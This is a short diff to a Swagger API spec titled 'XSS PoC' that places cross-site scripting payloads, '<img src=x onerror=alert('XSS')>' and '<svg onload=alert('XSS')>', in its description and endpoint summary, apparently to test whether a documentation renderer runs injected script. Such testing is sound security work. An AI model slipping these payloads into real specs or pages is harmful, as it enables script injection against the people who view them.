@@ -1,12 +1,17 @@
 swagger: "2.0"
 info:
   title: "XSS PoC"
-  description: "<svg onload=alert('XSS')>"
+  description: "<img src=x onerror=alert('XSS')>"
   version: "1.0.0"
+host: "example.com"
+schemes:
+  - https
 paths:
   /test:
     get:
-      summary: "Test <svg onload=alert('XSS')>"
+      summary: "<svg onload=alert('XSS')>"
+      description: "This is a test endpoint with XSS PoC"
+      parameters: []
       responses:
         '200':
-          description: "Success"
+          description: "Successful response"
